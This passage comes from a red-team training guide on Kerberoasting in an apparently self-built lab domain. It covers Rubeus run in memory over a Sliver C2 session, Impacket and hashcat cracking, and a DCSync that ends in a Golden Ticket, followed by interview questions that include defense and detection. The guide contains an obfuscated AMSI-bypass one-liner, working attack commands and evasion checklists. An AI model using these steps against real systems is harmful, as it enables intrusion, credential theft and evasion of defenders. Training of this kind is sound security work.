────────────────────────────────────────────────────────────────

✅ Keep Rubeus on KALI (never touches WS01 disk)
✅ Use Sliver's execute-assembly (in-memory execution)
✅ AMSI was already bypassed by our initial loader
✅ Exfiltrate hashes over C2 channel (encrypted HTTPS)
✅ Clean up any artifacts immediately
```

**This is the difference between a script kiddie and a red teamer.**

---

## 9.2: Prerequisites - Verify Your Sliver Session

**Make absolutely sure you have an active session:**

```bash
# On Kali - check sessions
┌──(kali㉿kali)-[~]
└─$ sliver-server

# In Sliver console
sliver > sessions

 ID         Name        Transport   Remote Address        Hostname   Username              Operating System   Health
========== =========== =========== ==================== ========== ===================== ================== ===========
 a1b2c3d4   LAZY_PANDA  https       192.168.100.20:54123  WS01       ORSUBANK\vamsi.krishna windows/amd64      [ALIVE]

# Interact with your session
sliver > use a1b2c3d4

[*] Active session LAZY_PANDA (a1b2c3d4)

sliver (LAZY_PANDA) >
```

**If you don't have this, go back to `00_initial_access_sliver_setup.md` first!**

---

## 9.3: Downloading Rubeus on Kali (Not on Target!)

**This is critical - Rubeus NEVER touches WS01's disk:**

```bash
# On Kali - create tools directory
mkdir -p /opt/red-team-tools
cd /opt/red-team-tools

# Download latest Rubeus from GitHub
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe

# Verify the download
ls -lh Rubeus.exe
# -rw-r--r-- 1 kali kali 164K Dec 29 10:00 Rubeus.exe

file Rubeus.exe
# Rubeus.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows

# This file STAYS on Kali
# We will use "execute-assembly" to run it remotely in WS01's memory
```

**Why this works:**
- Sliver reads the `.exe` file from your Kali disk
- Sends the bytes over encrypted C2 channel
- Loads it directly into memory on WS01
- No file ever gets written to WS01's disk
- Defender never sees a file to scan!

---

## 9.4: Verifying AMSI is Bypassed

**AMSI (Antimalware Scan Interface) is Microsoft's last line of defense.**

When you load a .NET assembly (like Rubeus), Windows calls AMSI to scan it.
If AMSI is active, Rubeus will be blocked even when loaded in memory.

**The good news:** Your initial Sliver payload already bypassed AMSI!

**Let's verify it's still bypassed:**

```bash
# From your Sliver session
sliver (LAZY_PANDA) > shell

# You now have a PowerShell prompt on WS01
C:\Users\vamsi.krishna> powershell

# Test if AMSI is bypassed - try a known signature
PS C:\> 'amsiutils'
# If AMSI is active → This will error: "This script contains malicious content"
# If AMSI is bypassed → You'll just see: amsiutils

# Better test - try to invoke a known bad command
PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# If bypassed → Returns nothing or null
# If active → Returns the type

PS C:\> exit
C:\> exit
```

**If AMSI is NOT bypassed (you get errors), re-run your loader or use this bypass:**

```bash
sliver (LAZY_PANDA) > execute -o powershell.exe -a '-Command "$x=[Ref].Assembly.GetTypes();ForEach($t in $x){if($t.Name -clike \'*siUtils\'){$t.GetFields(\'NonPublic,Static\')|%{if($_.Name -clike \'*ailed\'){$_.SetValue($null,$true)}}}}"'

# This patches AMSI in memory for the current session
```

---

## 9.5: Method 1 - Basic Kerberoasting (All Accounts)

**Now let's kerberoast ALL service accounts in ORSUBANK:**

```bash
# From Sliver console (NOT from shell!)
sliver (LAZY_PANDA) > execute-assembly /opt/red-team-tools/Rubeus.exe kerberoast /nowrap

# Let's break down what this does:
# ─────────────────────────────────────────────────────────────
# execute-assembly     → Sliver's in-memory .NET assembly loader
# /opt/.../Rubeus.exe  → Path to Rubeus on YOUR Kali machine
# kerberoast           → Rubeus command to request TGS tickets
# /nowrap              → Don't wrap output (easier to copy hashes)

# What happens behind the scenes:
# 1. Sliver reads Rubeus.exe from your Kali disk
# 2. Sends the bytes to WS01 over encrypted HTTPS
# 3. WS01 implant loads Rubeus into memory (no disk write!)
# 4. Executes it with arguments "kerberoast /nowrap"
# 5. Output is captured and sent back to you over C2
```

**Expected output:**

```
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.0

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : orsubank.local
[*] Searching path 'LDAP://DC01.orsubank.local/DC=orsubank,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 5

[*] SamAccountName         : sqlservice
[*] DistinguishedName      : CN=sqlservice,OU=Service Accounts,DC=orsubank,DC=local
[*] ServicePrincipalName   : MSSQLSvc/DC01.orsubank.local:1433
[*] PwdLastSet             : 12/28/2024 10:30:15
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*sqlservice$ORSUBANK.LOCAL$MSSQLSvc/DC01.orsubank.local:1433*$81F5AC37E2B4D9F1C8A3E6D5B2F9C1A4$...

[*] SamAccountName         : httpservice
[*] DistinguishedName      : CN=httpservice,OU=Service Accounts,DC=orsubank,DC=local
[*] ServicePrincipalName   : HTTP/web.orsubank.local
[*] PwdLastSet             : 12/28/2024 10:30:16
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*httpservice$ORSUBANK.LOCAL$HTTP/web.orsubank.local*$92D1F8B3A4C6E9D2B5F3A8C1D6E9F2B5$...

[*] SamAccountName         : iisservice
[*] DistinguishedName      : CN=iisservice,OU=Service Accounts,DC=orsubank,DC=local
[*] ServicePrincipalName   : HTTP/app.orsubank.local
[*] PwdLastSet             : 12/28/2024 10:30:17
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*iisservice$ORSUBANK.LOCAL$HTTP/app.orsubank.local*$A3B2C5D8E1F4A7B9C2D6E3F5A8B1C4D7$...

[*] SamAccountName         : backupservice
[*] DistinguishedName      : CN=backupservice,OU=Service Accounts,DC=orsubank,DC=local
[*] ServicePrincipalName   : MSSQLSvc/DC01.orsubank.local:1434
[*] PwdLastSet             : 12/28/2024 10:30:18
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*backupservice$ORSUBANK.LOCAL$MSSQLSvc/DC01.orsubank.local:1434*$B4C7D1E5F2A8B3C9D6E2F9A1C5D8E4B7$...

[*] SamAccountName         : svc_backup
[*] DistinguishedName      : CN=svc_backup,OU=Service Accounts,DC=orsubank,DC=local
[*] ServicePrincipalName   : backup/dc01.orsubank.local
[*] PwdLastSet             : 12/28/2024 10:30:19
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$backup/dc01.orsubank.local*$C5D8E2F6A9B4C7D1E5F2A8B3C9D6E2F9$...
```

**THIS IS GOLD!** You now have TGS hashes for 5 service accounts.

**Notice the encryption type: RC4_HMAC_DEFAULT**
- RC4 is 10x faster to crack than AES
- This is perfect for us!

---

## 9.6: Method 2 - Targeted Kerberoasting (Stealthier)

**Problem with Method 1:** You requested tickets for ALL 5 accounts.
This generates 5 Event ID 4769 logs on the DC - might trigger detection.

**Stealthier approach:** Only target the high-value account (svc_backup - the Domain Admin!)

```bash
# From Sliver console
sliver (LAZY_PANDA) > execute-assembly /opt/red-team-tools/Rubeus.exe kerberoast /user:svc_backup /nowrap

# Breaking it down:
# /user:svc_backup  → Only request ticket for this specific user
# This generates only 1 event instead of 5
# Much less likely to trigger volume-based detection
```

**Output:**

```
[*] Action: Kerberoasting

[*] Total kerberoastable users : 1

[*] SamAccountName         : svc_backup
[*] DistinguishedName      : CN=svc_backup,OU=Service Accounts,DC=orsubank,DC=local
[*] ServicePrincipalName   : backup/dc01.orsubank.local
[*] PwdLastSet             : 12/28/2024 10:30:19
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$backup/dc01.orsubank.local*$C5D8E2F6A9B4C7D1E5F2A8B3C9D6E2F9A1C5D8E4B7C2D6E9F3A8B1C4D7E2F5A9$B3C6D9E2F5A8B1C4D7E2F5A9B3C6D9E2F5A8B1C4D7E2F5A9B3C6D9E2F5A8B1C4D7E2F5A9B3C6D9E2F5A8B1C4...
```

**This single hash is all we need - it's a Domain Admin account!**

---

## 9.7: Method 3 - Force RC4 Encryption (Maximum Crackability)

**Sometimes accounts support both RC4 and AES encryption.**
Modern Windows prefers AES (harder to crack).

**We can force RC4 using the /tgtdeleg trick:**

```bash
sliver (LAZY_PANDA) > execute-assembly /opt/red-team-tools/Rubeus.exe kerberoast /tgtdeleg /enctype:rc4 /nowrap

# What this does:
# /tgtdeleg  → Uses a Kerberos delegation trick to request ticket
# /enctype:rc4 → Specifically requests RC4 encryption
# Even if the account supports AES, we'll get RC4 if possible
```

**Why this matters:**

| Encryption | Hashcat Mode | GPU Speed (RTX 3090) | Time to Crack 8-char password |
|------------|--------------|----------------------|-------------------------------|
| RC4 (etype 23) | 13100 | ~2,500,000/sec | Minutes to Hours |
| AES256 (etype 18) | 19700 | ~250,000/sec | Hours to Days |

**RC4 is literally 10x faster to crack!**

---

## 9.8: Saving Hashes Securely

**Now you have hashes in your terminal. Save them for cracking:**

```bash
# Copy the hash output from your terminal
# It looks like this:
# $krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$backup/dc01.orsubank.local*$C5D8...

# Create a file on Kali
nano /tmp/kerberoast_hashes.txt

# Paste ALL the hashes, one per line:
$krb5tgs$23$*sqlservice$ORSUBANK.LOCAL$MSSQLSvc/DC01.orsubank.local:1433*$81F5AC37E2B4...
$krb5tgs$23$*httpservice$ORSUBANK.LOCAL$HTTP/web.orsubank.local*$92D1F8B3A4C6E9D2B5...
$krb5tgs$23$*iisservice$ORSUBANK.LOCAL$HTTP/app.orsubank.local*$A3B2C5D8E1F4A7B9C2D6...
$krb5tgs$23$*backupservice$ORSUBANK.LOCAL$MSSQLSvc/DC01.orsubank.local:1434*$B4C7D1E5...
$krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$backup/dc01.orsubank.local*$C5D8E2F6A9B4C7D1E5...

# Save (Ctrl+O, Enter, Ctrl+X)

# Verify
cat /tmp/kerberoast_hashes.txt | wc -l
# 5 (if you saved 5 hashes)
```

---

## 9.9: Alternative - Kerberoasting from Kali (Zero Execution on Target!)

**This is the STEALTHIEST method - nothing runs on WS01!**

**Requirement:** You need valid domain credentials (we have vamsi.krishna's password from initial access)

```bash
# On Kali - using Impacket's GetUserSPNs.py
┌──(kali㉿kali)-[~]
└─$ GetUserSPNs.py orsubank.local/vamsi.krishna:'Password123!' -dc-ip 192.168.100.10 -request -outputfile kerberoast_hashes.txt

# Breaking it down:
# orsubank.local/vamsi.krishna  → Domain and username
# 'Password123!'                → vamsi's password (from initial access)
# -dc-ip 192.168.100.10         → DC01's IP address
# -request                      → Request TGS tickets
# -outputfile hashes.txt        → Save to file

# What happens:
# 1. Your Kali machine authenticates to DC01 as vamsi.krishna
# 2. Queries LDAP for accounts with SPNs
# 3. Requests TGS tickets for each account
# 4. Saves the tickets to file
# 5. NOTHING executes on WS01!
```

**Output:**

```
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName                  Name          MemberOf                                      PasswordLastSet             LastLogon  Delegation 
------------------------------------  ------------  --------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/DC01.orsubank.local:1433     sqlservice    CN=ServiceAccounts,OU=Groups,DC=orsubank,DC=local  2024-12-28 10:30:15.547125  <never>             
HTTP/web.orsubank.local               httpservice   CN=ServiceAccounts,OU=Groups,DC=orsubank,DC=local  2024-12-28 10:30:16.234567  <never>             
HTTP/app.orsubank.local               iisservice    CN=ServiceAccounts,OU=Groups,DC=orsubank,DC=local  2024-12-28 10:30:17.123456  <never>             
MSSQLSvc/DC01.orsubank.local:1434     backupservice CN=ServiceAccounts,OU=Groups,DC=orsubank,DC=local  2024-12-28 10:30:18.987654  <never>             
backup/dc01.orsubank.local            svc_backup    CN=Domain Admins,CN=Users,DC=orsubank,DC=local     2024-12-28 10:30:19.654321  <never>             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlservice$ORSUBANK.LOCAL$orsubank.local/sqlservice*$81f5ac37e2b4d9f1...
$krb5tgs$23$*httpservice$ORSUBANK.LOCAL$orsubank.local/httpservice*$92d1f8b3a4c6e9d2...
$krb5tgs$23$*iisservice$ORSUBANK.LOCAL$orsubank.local/iisservice*$a3b2c5d8e1f4a7b9...
$krb5tgs$23$*backupservice$ORSUBANK.LOCAL$orsubank.local/backupservice*$b4c7d1e5f2a8...
$krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$orsubank.local/svc_backup*$c5d8e2f6a9b4c7d1...

# Hashes saved to kerberoast_hashes.txt
```

**Benefits of this method:**
- ✅ Zero execution on WS01 (no AMSI, no Defender, no logs on endpoint)
- ✅ Only logs on DC (Event ID 4769 - normal Kerberos traffic)
- ✅ Can be done from anywhere with network access to DC
- ✅ Works even if you lose your Sliver session

**When to use each method:**

| Method | Use When | Stealth Level |
|--------|----------|---------------|
| execute-assembly | You need it to work from compromised endpoint | ⭐⭐⭐ Medium |
| /user:target | You want minimum log volume | ⭐⭐⭐⭐ High |
| GetUserSPNs.py from Kali | You have creds, want zero endpoint execution | ⭐⭐⭐⭐⭐ Maximum |

---

## 9.10: Operational Security Checklist

```
BEFORE YOU KERBEROAST - OPSEC REVIEW:
────────────────────────────────────────────────────────────────

✅ AMSI is bypassed on target session
✅ Using execute-assembly (not uploading Rubeus.exe)
✅ OR using GetUserSPNs from Kali (even better)
✅ Selected target accounts (not blasting all SPNs)
✅ Requested RC4 encryption (easier to crack)
✅ Operating during business hours (9AM-5PM) - blends with normal traffic
✅ Saved hashes to local Kali (not on network share)

WHAT GETS LOGGED:
──────────────────

ON DC01 (Event ID 4769):
- User: vamsi.krishna
- Service: backup/dc01.orsubank.local
- Encryption: RC4
- Result: Success

This looks like NORMAL Kerberos authentication!
You're not doing anything technically "wrong" - you're just asking for tickets.

WILL DEFENDER CATCH THIS?
──────────────────────────

❌ NO file was written to disk on WS01
❌ NO suspicious process (if using GetUserSPNs from Kali)
❌ NO AMSI alert (bypassed)
❌ Kerberos traffic is encrypted and normal-looking

✅ You're safe!
```

---

## 9.11: What Just Happened - The Full Picture

**Let me explain the entire attack chain in simple terms:**

```
THE KERBEROASTING ATTACK CHAIN:
────────────────────────────────────────────────────────────────

STEP 1: You (vamsi.krishna) are logged into WS01
        ↓
STEP 2: You ask the KDC: "Give me a ticket for svc_backup's service"
        ↓
STEP 3: KDC checks: "Is vamsi.krishna authenticated?" → YES (you have a TGT)
        "Does vamsi.krishna have permission to request this?" → YES (any user can)
        ↓
STEP 4: KDC creates a service ticket (TGS)
        Encrypts it with: svc_backup's password hash
        ↓
STEP 5: KDC sends you the encrypted ticket
        ↓
STEP 6: You now have: Encrypted blob that ONLY svc_backup's password can decrypt
        ↓
STEP 7: You try to crack it offline:
        - Try password "Password123" → Decrypt → Fail
        - Try password "Backup@2024!" → Decrypt → SUCCESS!
        ↓
STEP 8: YOU NOW KNOW svc_backup's password!
        ↓
STEP 9: svc_backup is Domain Admin → GAME OVER!


WHY THIS WORKS:
───────────────

The KDC MUST encrypt the service ticket with the service's password.
Otherwise, the service couldn't decrypt it to verify your identity.

This is not a bug - it's by design.

The designers assumed service accounts would have STRONG passwords.
In reality? "Backup@2024!" is very common.
```

---

# PART 10: Cracking Methodology {#part-10-cracking}

## 10.1: Hash Mode Selection

| Encryption | Hashcat Mode | Speed (RTX 3090) |
|------------|--------------|------------------|
| RC4 (etype 23) | 13100 | ~2.5M hashes/sec |
| AES128 (etype 17) | 19600 | ~250K hashes/sec |
| AES256 (etype 18) | 19700 | ~250K hashes/sec |

**RC4 is 10x faster to crack!**

## 10.2: Basic Hashcat Attack

```bash
# Basic dictionary attack
hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt
```

## 10.3: With Rules (Recommended)

**Rules add mutations like "password" → "Password!" or "P@ssw0rd123":**

```bash
# Dictionary + best64 rules
hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Dictionary + OneRuleToRuleThemAll (comprehensive)
hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
```

## 10.4: Better Wordlists

```bash
# SecLists - various specialized lists
hashcat -m 13100 hashes.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt

# Custom corporate wordlist
# Include: company name, year, season, common patterns
echo -e "Orsubank2024\\nOrsu@2024\\nBank@2024\\nBanking123\\nOrsubank!" > corporate.txt
hashcat -m 13100 hashes.txt corporate.txt -r best64.rule
```

## 10.5: Combinator Attack

**Combine two wordlists:**

```bash
# Combine "words" with "numbers"
hashcat -m 13100 hashes.txt -a 1 words.txt numbers.txt
```

## 10.6: Reading Results

**Successful crack:**
```
$krb5tgs$23$*svc_backup$ORSUBANK.LOCAL$backup/dc01.orsubank.local*$A2C3D4E5...:Backup@2024!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: /tmp/kerberoast.txt
Time.Started.....: Fri Dec 27 16:30:00 2024
```

**The password is after the colon: `Backup@2024!`**

## 10.7: If Cracking Fails

1. **Extend wordlist**: Add company-specific terms
2. **Add rules**: More mutations
3. **Mask attack**: For patterns like "Service2024!"
   ```bash
   hashcat -m 13100 hashes.txt -a 3 ?u?l?l?l?l?l?l?d?d?d?d
   ```
4. **Hybrid attack**: Wordlist + patterns
   ```bash
   hashcat -m 13100 hashes.txt -a 6 wordlist.txt ?d?d?d?d
   ```
5. **Consider AES**: If you only have AES hashes, cracking is 10x slower

---

# PART 11: Post-Exploitation {#part-11-post-exploitation}

## 11.1: Verify Credentials Work

```bash
# Test with crackmapexec
crackmapexec smb DC01.orsubank.local -u svc_backup -p 'Backup@2024!' -d orsubank.local

# Expected output for admin account:
SMB   192.168.100.10   445   DC01   [+] orsubank.local\svc_backup:Backup@2024! (Pwn3d!)
```

**(Pwn3d!) means you have admin access!**

## 11.2: Check Group Memberships

```bash
# What groups is this account in?
crackmapexec smb DC01.orsubank.local -u svc_backup -p 'Backup@2024!' --groups

# Or via LDAP
ldapsearch -H ldap://192.168.100.10 -D "svc_backup@orsubank.local" -w 'Backup@2024!' \
  -b "DC=orsubank,DC=local" "(sAMAccountName=svc_backup)" memberOf
```

## 11.3: If Account is Domain Admin

**DCSync to dump ALL hashes:**

```bash
# Using secretsdump
secretsdump.py orsubank.local/svc_backup:'Backup@2024!'@DC01.orsubank.local

# Output includes:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe388c00c7e6b5f9b:::
```

**Now you have:**
- Administrator hash → Pass-the-Hash anywhere
- KRBTGT hash → **Golden Ticket** (10-year persistence!)

## 11.4: If Account is NOT Domain Admin

**Check what access you gained:**

```bash
# Can you RDP?
crackmapexec rdp DC01.orsubank.local -u svc_sql -p 'SqlSvc@2024!'

# Can you PSRemote?
crackmapexec winrm DC01.orsubank.local -u svc_sql -p 'SqlSvc@2024!'

# What shares can you access?
crackmapexec smb DC01.orsubank.local -u svc_sql -p 'SqlSvc@2024!' --shares
```

**Continue attack path:**
- Use BloodHound to find path from svc_sql to Domain Admin
- Pivot to machines where svc_sql has access
- Look for credentials on SQL servers

## 11.5: Attack Chain Summary

```
KERBEROASTING → DOMAIN ADMIN:
────────────────────────────────────────────────────────────────

1. Initial Access
   └── vamsi.krishna @ WS01 (regular domain user)

2. Kerberoasting
   └── Bypassed AMSI
   └── Ran Rubeus kerberoast
   └── Got TGS hashes for 4 service accounts

3. Targeted Cracking
   └── Focused on svc_backup (in Domain Admins per BloodHound)
   └── Cracked with hashcat: Backup@2024!

4. Privilege Escalation
   └── svc_backup is Domain Admin
   └── Used secretsdump to DCSync
   └── Got Administrator and KRBTGT hashes

5. Persistence
   └── Golden Ticket with KRBTGT hash
   └── 10+ year persistence

Time: ~1 hour
Detection: LOW (offline cracking, minimal network traffic)
```

---

# PART 12: Interview Questions {#part-12-interview}

## Q1: "Explain Kerberoasting technically - what makes it possible?"

**ANSWER:**
"Kerberoasting exploits the fundamental design of Kerberos TGS ticket encryption.

When a client requests a service ticket (TGS-REQ), the KDC finds the account associated with that SPN and encrypts the TGS ticket with that account's NTLM hash. This design allows the service to decrypt the ticket using its own password.

The vulnerability exists because:
1. ANY domain user can request a TGS for ANY SPN
2. The encrypted ticket data is returned to the requestor
3. The encryption key is derived from the service account's password
4. If the password is weak, we can perform offline dictionary attacks

Technically, the encrypted portion uses RC4-HMAC (etype 23) or AES, depending on configuration. RC4 is significantly faster to crack - about 2.5 million guesses per second on a modern GPU versus 250K for AES.

I use Rubeus with execute-assembly to collect hashes in memory, then hashcat -m 13100 for cracking. The attack requires no special privileges and generates minimal detection artifacts since Kerberos ticket requests are normal behavior."

---

## Q2: "Walk me through the Kerberos authentication flow."

**ANSWER:**
"Kerberos uses a ticket-based authentication system with three phases:

**Phase 1 - Get TGT (Authentication):**
1. Client sends AS-REQ with username and pre-auth (timestamp encrypted with password hash)
2. KDC decrypts pre-auth using user's hash from NTDS.dit
3. If valid, KDC returns AS-REP containing TGT encrypted with KRBTGT's hash
4. Client can decrypt the session key portion with their own hash

**Phase 2 - Get Service Ticket:**
1. Client sends TGS-REQ with TGT and target SPN
2. KDC verifies TGT using KRBTGT's hash
3. KDC finds account with that SPN
4. KDC returns TGS-REP with ticket encrypted using SERVICE ACCOUNT's hash

**Phase 3 - Access Service:**
1. Client sends AP-REQ with service ticket to target service
2. Service decrypts ticket with its own hash
3. Service validates ticket and grants access

The vulnerability in Kerberoasting is in Phase 2 - we request the TGS and try to crack the service account's password offline."

---

## Q3: "What's the difference between RC4 and AES encryption in Kerberos?"

**ANSWER:**
"RC4 and AES refer to the encryption algorithms used for Kerberos tickets:

**RC4-HMAC (etype 23):**
- Uses the NTLM hash directly as the encryption key
- Cracking speed: ~2.5 million hashes/second on GPU
- Hashcat mode 13100
- Common in older or misconfigured environments
- Microsoft recommends disabling it

**AES (etypes 17/18):**
- Uses PBKDF2 to derive keys from the password
- Cracking speed: ~250K hashes/second (10x slower)
- Hashcat modes 19600 (AES128) and 19700 (AES256)
- More secure, recommended by Microsoft

**Practical implications:**
- Always try to get RC4 hashes when possible
- Rubeus can request RC4 specifically: `/enctype:rc4`
- If service only supports AES, cracking takes 10x longer
- Defense: Configure accounts for AES-only by enabling 'This account supports AES encryption' and disabling DES/RC4"

---

## Q4: "How do you find Kerberoastable accounts?"

**ANSWER:**
"An account is Kerberoastable if it's a user account (not computer) with an SPN set.

**Via BloodHound:**
```cypher
MATCH (u:User {hasspn: true}) RETURN u.name, u.pwdlastset
```
Or use the pre-built 'List all Kerberoastable Accounts' query.

**Via LDAP:**
```
(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))
```

**Via PowerShell:**
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet
```

**Via Rubeus:**
```
Rubeus.exe kerberoast /stats
```
This shows Kerberoastable accounts without extracting tickets.

**Prioritization:**
I prioritize by group memberships (BloodHound path to DA), password age (older = likely weaker), and encryption type (RC4 = faster to crack)."

---

## Q5: "What tools do you use for Kerberoasting and why?"

**ANSWER:**
"**Collection:**
- **Rubeus (C#)**: My primary tool. Runs via execute-assembly in memory, leaving minimal artifacts. Supports targeted extraction, encryption type selection, and stat gathering.
- **GetUserSPNs.py (Impacket)**: For remote Kerberoasting from Linux without executing anything on target. Maximum stealth.
- **Invoke-Kerberoast (PowerShell)**: Less preferred due to PowerShell logging, but works if that's all available.

**Cracking:**
- **Hashcat**: Primary cracker. GPU-accelerated, supports rules, multiple attack modes. Mode 13100 for RC4, 19600/19700 for AES.
- **John the Ripper**: Alternative, slightly slower but good for quick checks.

**My workflow:**
1. AMSI bypass via Sliver
2. `execute-assembly Rubeus.exe kerberoast /user:target /nowrap`
3. Copy hash to Kali
4. `hashcat -m 13100 hash.txt rockyou.txt -r best64.rule`
5. Verify with crackmapexec"

---

## Q6: "How would you defend against Kerberoasting?"

**ANSWER:**
"Multi-layered defense:

**Password Strength:**
- Minimum 25+ character random passwords for service accounts
- Use gMSAs (Group Managed Service Accounts) where possible - 240-bit random, auto-rotating

**Encryption:**
- Configure service accounts for AES-only encryption
- Disable RC4: Set `msDS-SupportedEncryptionTypes` to 24 (AES only)
- AES is 10x slower to crack

**Reduce Attack Surface:**
- Audit SPNs regularly: `Get-ADUser -Filter {ServicePrincipalName -ne '$null'}`
- Remove unnecessary SPNs
- Don't put service accounts in privileged groups

**Detection:**
- Monitor Event ID 4769 (Kerberos service ticket requests)
- Alert on: Many requests from one user, RC4 requests, unusual SPNs
- Honeypot SPNs: Create fake service accounts with enticing names

**Privilege Reduction:**
- Service accounts should have ONLY the permissions they need
- Never put service accounts in Domain Admins"

---

## Q7: "What is targeted Kerberoasting?"

**ANSWER:**
"Targeted Kerberoasting is requesting tickets only for specific high-value accounts rather than all Kerberoastable accounts.

**Why it's better:**
1. **Less noise**: Requesting one ticket vs. dozens
2. **Fewer logs**: One Event 4769 instead of many
3. **Focused effort**: Crack the most valuable target first
4. **Evades detection**: Volume-based alerts don't trigger

**How to do it:**
```bash
# First, identify high-value targets with BloodHound
# Cypher: Users with SPNs that have path to DA

# Then, request only that one:
Rubeus.exe kerberoast /user:svc_backup /nowrap
```

**When to use:**
- When stealth is important
- When you already know which account has value (via BloodHound)
- When you want to minimize Event logs

**Contrast with traditional Kerberoasting:**
- Traditional: Get ALL tickets, sort by value later
- Targeted: Get ONLY the most valuable ticket"

---

## Q8: "Explain the targeted Kerberoasting attack using ACL abuse."

**ANSWER:**
"If you have GenericAll or GenericWrite on a user account, you can make ANY user Kerberoastable:

**The Attack:**
1. Add an SPN to the target user
2. Request TGS for that SPN
3. Crack the hash
4. Remove the SPN (cleanup)

**Example:**
```powershell
# Add SPN to target (via Sliver)
Set-ADUser -Identity domain_admin -ServicePrincipalName @{Add='HTTP/pwned.orsubank.local'}

# Request the ticket
Rubeus.exe kerberoast /user:domain_admin /nowrap

# Remove SPN
Set-ADUser -Identity domain_admin -ServicePrincipalName @{Remove='HTTP/pwned.orsubank.local'}
```

**Why this is powerful:**
- Normally a Domain Admin account has no SPN
- GenericAll lets us temporarily SET an SPN
- Now we can Kerberoast what was previously not Kerberoastable
- Works on any user account we can modify

**BloodHound shows this:**
Objects we have GenericAll/GenericWrite on are potential targeted Kerberoasting victims."

---

## Q9: "What's the difference between a TGT and TGS in Kerberos?"

**ANSWER:**
"**TGT (Ticket Granting Ticket):**
- Your 'master ticket' obtained after authentication
- Encrypted with KRBTGT account's hash
- You present this to get service tickets
- Cannot be Kerberoasted (KRBTGT has random 128+ char password)
- 10-hour default lifetime
- Forging TGTs = Golden Ticket attack (requires KRBTGT hash)

**TGS (Ticket Granting Service / Service Ticket):**
- A ticket for a specific service
- Encrypted with the SERVICE ACCOUNT's hash
- CAN be Kerberoasted if service account has weak password
- Used to access the actual service
- Also 10-hour default lifetime
- Forging TGS = Silver Ticket attack (requires service hash)

**The key difference for attackers:**
- TGT encryption key (KRBTGT) is uncrackable
- TGS encryption key (service account) might be crackable
- This is why we target TGS tickets in Kerberoasting"

---

## Q10: "How would you detect my Kerberoasting activity?"

**ANSWER:**
"As a defender, I'd look for these indicators:

**Event Log Monitoring:**
- Event ID 4769: Kerberos Service Ticket Request
- Alert on: Many 4769 from single user in short time
- Alert on: RC4 encryption type (Ticket Encryption Type: 0x17)
- Alert on: Requests for unusual/all SPNs

**Behavioral Analysis:**
- Baseline normal TGS request patterns
- Flag users requesting many different services rapidly
- Flag service ticket requests from non-server computers
- Flag requests during off-hours

**Honeypots:**
- Create fake service accounts: 'svc_admin_backup', 'sql_production'
- Set weak passwords
- Any request for these SPNs = immediate alert
- Attackers running 'kerberoast /all' will hit them

**Network Monitoring:**
- TGS-REQ packets to KDC at unusual volume
- Correlation: LDAP enumeration followed by TGS requests

**EDR:**
- Rubeus.exe execution or similar tools
- Execute-assembly patterns
- AMSI bypass signatures

The best detection combines multiple data sources - an attacker requesting tickets from a workstation that just ran LDAP enumeration is highly suspicious."

---

# PART 13: Troubleshooting {#part-13-troubleshoot}

## 13.1: Rubeus Blocked by AMSI/Defender

**Always bypass AMSI first:**
```bash
sliver > execute -o powershell.exe -Command "$x=[Ref].Assembly.GetTypes();ForEach($t in $x){if($t.Name -clike '*siUtils'){$t.GetFields('NonPublic,Static')|%{if($_.Name -clike '*ailed'){$_.SetValue($null,$true)}}}}"
```

**Alternative:** Use GetUserSPNs.py from Kali instead.

## 13.2: No Kerberoastable Accounts Found

**Check manually:**
```bash
sliver > execute -o powershell.exe -Command "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName | Select Name,ServicePrincipalName"
```

**If none exist:**
- Lab not set up correctly
- Run `Enable-Kerberoasting.ps1` on DC01

## 13.3: Hashcat Can't Recognize Format

**Ensure proper format:**
```
$krb5tgs$23$*username$REALM$spn*$hash_data...
```

**Check for line wrapping issues.** Use `/nowrap` in Rubeus.

## 13.4: Cracking Takes Too Long

1. Start with RC4 hashes (mode 13100)
2. Use targeted wordlists (company name, year, etc.)
3. Apply rules strategically
4. Consider cloud cracking services for AES

